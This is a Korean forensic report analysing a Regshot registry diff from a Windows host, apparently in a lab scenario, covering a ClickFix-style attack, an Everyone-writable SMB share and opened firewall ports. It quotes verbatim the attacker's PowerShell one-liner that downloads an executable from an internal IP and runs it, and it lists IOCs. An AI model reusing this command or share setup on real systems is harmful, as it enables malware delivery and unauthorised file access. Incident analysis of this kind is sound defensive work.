# DESKTOP-IS00QJN Regshot 비교 분석 보고서

## 1. 증적 개요

| 항목 | 확인값 |
|---|---|
| 원본 파일 | `레지샷.txt` |
| 형식 | Regshot 1.9.1 x64 Unicode 비교 로그(UTF-16LE BOM) |
| SHA-256 | `6A323931943E937C234087062DB954B93846BF137ED483708D1B8D92A2A82ADF` |
| 대상 시스템 | `DESKTOP-IS00QJN` |
| 사용자 | `Administrator` |
| Before | 2026-09-15 00:35:50 |
| After | 2026-09-15 02:28:28 |
| 시간대 | Regshot 파일 자체에는 시간대가 없음. 현재 분석 환경의 로컬 시간대는 KST(UTC+9) |
| 전체 변경 수 | 6,816건 |
| 세부 집계 | Keys deleted 174, Keys added 317, Values deleted 4,247, Values added 1,478, Values modified 600 |

## 2. 주요 Finding

| 우선순위 | Finding | 레지스트리 키/값 | Before | After | 시간정보 | 의미 및 시나리오 연관성 |
|---|---|---|---|---|---|---|
| 높음 | Run 대화상자를 통한 PowerShell 다운로드·검증·실행 명령 | `HKU\S-1-5-21-1291778260-3289171352-1194275199-1107\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\d` | 값 없음 | `powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'ca7376fb8a63573c3ae02147e6105bce76c091bc7d39c6f2d449bbe9b69e5fc8'){&$p}else{ri $p -Force}"\1` | 값 자체 timestamp 없음. Before–After 구간 내 생성 | `-nop`로 PowerShell을 실행하고 `192.168.50.10:8000/a.exe`를 `%TEMP%\a.exe`로 내려받은 뒤 SHA-256 검증 성공 시 실행한다. ClickFix 유형의 Run 대화상자 기반 실행과 직접 부합한다. 다만 다운로드 성공 및 Sliver 여부는 이 값만으로 확정할 수 없다. |
| 높음 | RunMRU 순서 변경으로 새 명령 등록 교차확인 | 같은 키의 `MRUList` | `cba` | `adcb` | 값 자체 timestamp 없음 | 새 `d` 항목이 MRU 목록에 포함되었음을 확인한다. 위 PowerShell 명령이 단순 문자열 잔재가 아니라 RunMRU에 실제 등록된 사실을 보강한다. |
| 중간 | PowerShell 실행 시각 보강 | `HKU\S-1-5-21-1291778260-3289171352-1194275199-1107\Software\Microsoft\Windows\CurrentVersion\Search\JumplistData\{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe` | 값 없음 | `0x01DD44B5F13319F2` | 2026-09-15 02:00:11.741029 UTC / 11:00:11.741029 KST | PowerShell 관련 검색/점프리스트 활동 시각이다. RunMRU 명령의 정확한 실행시각이라고 단정할 수는 없지만 캡처 구간 내 PowerShell 사용을 보강한다. |
| 중간 | 위장된 실행 파일 경로의 UserAssist 흔적 | `...\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count\{S38OS404-1Q43-42S2-9305-67QR0O28SP23}\Grzc\Xvfrp\cnlybnqf\fipubfg.rkr` | 값 없음 | 72-byte binary UserAssist 데이터 | 내부 FILETIME이 0이어서 개별 시각 확인 불가 | 값 이름을 UserAssist ROT13 규칙으로 복호화하면 `{F38BF404-1D43-42F2-9305-67DE0B28FC23}\Temp\Kisec\payloads\svchost.exe`이다. GUID는 Windows 폴더를 가리키므로 경로는 `%WINDIR%\Temp\Kisec\payloads\svchost.exe`로 해석된다. 시스템 파일명 위장 가능성이 높으나 Sliver라는 제품 식별은 불가하다. |
| 높음 | `TempShare` SMB 공유 생성 | `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\TempShare` | 값 없음 | `CATimeout=0`, `CSCFlags=0`, `MaxUses=4294967295`, `Path=C:\TempShare`, `Permissions=63`, `ShareName=TempShare`, `Type=0` | 값 자체 timestamp 없음. Before–After 구간 내 생성 | `C:\TempShare`가 `TempShare`라는 이름으로 새로 공유되었다. 파일 서버 접근 또는 측면 이동 준비/전송과 직접 관련성이 높은 변경이다. `ControlSet001`에 표시된 동일 항목은 같은 논리 변경의 별칭으로 중복 집계하지 않았다. |
| 높음 | `TempShare`에 Everyone Full Control ACL 설정 | `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\Security\TempShare` | 값 없음 | 76-byte self-relative security descriptor | 값 자체 timestamp 없음 | DACL의 접근 허용 ACE는 SID `S-1-1-0`(Everyone)에 mask `0x001F01FF`를 부여한다. 이는 Full Control로 해석되며 무단 파일 접근·전송 위험이 크다. |
| 높음 | SMB·NetBIOS·RPC 관련 공용 프로필 방화벽 허용 규칙 추가 | `HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules\{GUID}` 16개 | 값 없음 | `Active=TRUE`, `Action=Allow`; Public 프로필에 TCP 445/139, UDP 137/138, RPC/RPC-EPMap 및 관련 LLMNR/ICMP 규칙 | 값 자체 timestamp 없음. Before–After 구간 내 생성 | 특히 인바운드 TCP 445와 139 및 RPC 허용은 `TempShare`의 네트워크 접근성을 높인다. 파일 공유/측면 이동 시나리오와 강하게 연관되지만, 규칙 생성 주체와 실제 원격 접속 성공 여부는 별도 로그가 필요하다. |
| 보강 | PowerShell 이름의 RAS 추적 키 생성 | `HKLM\SOFTWARE\Microsoft\Tracing\PowerShell_RASAPI32`, `PowerShell_RASMANCS` | 키 없음 | 추적 설정 키 생성; `EnableFileTracing=0`, `FileDirectory=%windir%\tracing` 등 | 값 자체 timestamp 없음 | PowerShell 프로세스에서 RAS 구성요소가 사용된 정황으로 볼 수 있다. 추적은 비활성화 상태이며, C2 연결 자체를 입증하지는 않는다. |

## 3. 우선 검토 영역별 결과

| 검토 영역 | 결과 | 판단 |
|---|---|---|
| 서비스 등록/변경 | VMware `vm3dservice`, `VMRawDsk` 관련 삭제·추가가 존재 | 서비스 이름의 대소문자 변화와 VMware Tools/드라이버 갱신 흔적이 중심이다. 실행 경로는 전후 동일하며 공백 없는 시스템 경로이다. 시나리오의 악성 서비스 또는 Unquoted Service Path LPE 증적으로 판단하지 않는다. |
| Unquoted Service Path | 확인되지 않음 | 변경된 서비스 `ImagePath`에서 공격 시나리오에 해당하는 공백 포함 비인용 실행 경로를 확인하지 못했다. |
| Run/RunOnce 지속성 | 자동 시작 키 변경 없음 | `RunMRU`는 지속성 키가 아니라 Windows Run 대화상자 실행 이력이다. 이를 Run 자동 시작 키와 혼동해서는 안 된다. |
| Winlogon | 침해성 변경 없음 | 확인된 `PasswordExpiryNotification\NotShownTime` 변화는 일반 상태 갱신이다. |
| IFEO / AppInit | 변경 없음 | `Debugger`, `GlobalFlag`, `AppInit_DLLs` 관련 변경이 없다. |
| Defender/보안 설정 | 변경 없음 | Defender 정책·예외·실시간 감시 비활성화, LSA `RunAsPPL`, WDigest `UseLogonCredential` 관련 변화가 없다. |
| 사용자/권한 설정 | 변경 없음 | SAM 사용자 생성이나 `SpecialAccounts\UserList`, `LocalAccountTokenFilterPolicy`, UAC `EnableLUA`, `AlwaysInstallElevated` 관련 변화가 없다. |
| LSASS dump | 직접 증적 없음 | `lsass`, `comsvcs MiniDump`, ProcDump, Mimikatz 계열 문자열 및 관련 보호 설정 변경이 없다. Regshot만으로 프로세스 메모리 덤프 행위를 배제할 수는 없다. |
| File Server lateral movement | 강한 준비/노출 정황 | `TempShare` 생성, Everyone Full Control, SMB 445/139 및 RPC 관련 방화벽 허용이 함께 확인된다. 실제 원격 로그온·파일 복사 대상과 성공 여부는 이벤트/네트워크 로그로 확인해야 한다. |
| Sliver C2 | 제품 식별 불가 | PowerShell이 내부 IP에서 실행 파일을 다운로드하고 실행하도록 입력된 사실은 확인되지만, `a.exe`가 Sliver beacon이라는 판단에는 파일 해시 조회, 바이너리 분석 또는 C2 트래픽이 필요하다. |

## 4. IOC 및 수집 포인트

| 유형 | 값 |
|---|---|
| 다운로드 URL | `http://192.168.50.10:8000/a.exe` |
| 다운로드 대상 | `%TEMP%\a.exe` |
| 명령 내 기대 SHA-256 | `ca7376fb8a63573c3ae02147e6105bce76c091bc7d39c6f2d449bbe9b69e5fc8` |
| 의심 실행 경로 | `%WINDIR%\Temp\Kisec\payloads\svchost.exe` |
| 생성 공유 | `\\DESKTOP-IS00QJN\TempShare` → `C:\TempShare` |
| 공유 ACL | Everyone Full Control (`S-1-1-0`, mask `0x001F01FF`) |

## 5. 최종 결론

Regshot은 Autoruns ARN 비교에서 드러나지 않았던 핵심 침해 정황을 제공한다. **ClickFix형 PowerShell 명령 입력은 직접 확인**되며, 내부 서버에서 `a.exe`를 내려받아 해시 검증 후 실행하도록 구성되어 있다. 또한 의심스러운 `%WINDIR%\Temp\Kisec\payloads\svchost.exe` UserAssist 항목이 생성되었다.

측면 이동 단계에서는 `TempShare` 공유 생성, Everyone Full Control ACL, SMB/NetBIOS/RPC 방화벽 허용이 함께 나타나므로 **파일 공유를 통한 원격 접근 준비 또는 노출 정황은 강함**으로 판단한다. 반면 Sliver 제품 식별, Unquoted Service Path LPE 및 LSASS dump는 이 Regshot 자료만으로 확인되지 않는다.
